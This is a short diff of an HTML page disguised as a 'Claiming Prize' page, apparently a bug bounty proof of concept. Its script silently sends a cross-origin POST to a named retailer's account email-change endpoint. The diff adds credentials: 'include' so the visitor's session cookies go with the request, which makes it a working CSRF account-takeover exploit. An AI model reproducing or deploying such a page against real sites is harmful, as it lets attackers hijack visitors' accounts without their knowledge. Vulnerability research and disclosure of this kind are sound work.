@@ -4,15 +4,15 @@
 <body>
     <h1>Claiming Prize...</h1>
     <script>
-        // This sends the request EXACTLY like Burp Repeater
-        // No trailing '=' sign, no extra parameters.
+        // The 'credentials: include' line is the key to the payout
         fetch("https://www.boozt.com/eu/en/api/customer/profile/email/change", {
             method: "POST",
-            mode: "no-cors", // This is the magic switch that allows cross-origin POST
+            mode: "no-cors",
+            credentials: "include", // <--- THIS IS WHAT WE MISSED
             headers: {
                 "Content-Type": "text/plain"
             },
-            body: '{"email":"absolutexon+fetchattack@wearehackerone.com"}'
+            body: '{"email":"absolutexon+payout@wearehackerone.com"}'
         });
     </script>
 </body>
